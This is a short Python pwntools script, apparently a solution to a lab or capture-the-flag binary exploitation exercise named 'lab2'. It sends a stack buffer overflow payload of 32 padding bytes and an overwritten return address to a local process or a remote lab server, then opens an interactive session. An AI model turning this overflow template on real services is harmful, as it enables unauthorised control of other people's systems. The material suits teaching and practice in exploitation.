#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 1

host = "beef.nisra.net"
port = "8889"

if _local:
	r = process('./lab2')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

payload = 'A'*32
payload += p32(0x080484eb)

print r. recvuntil(':')
r.sendline(payload)
# print r.recv()
r.interactive()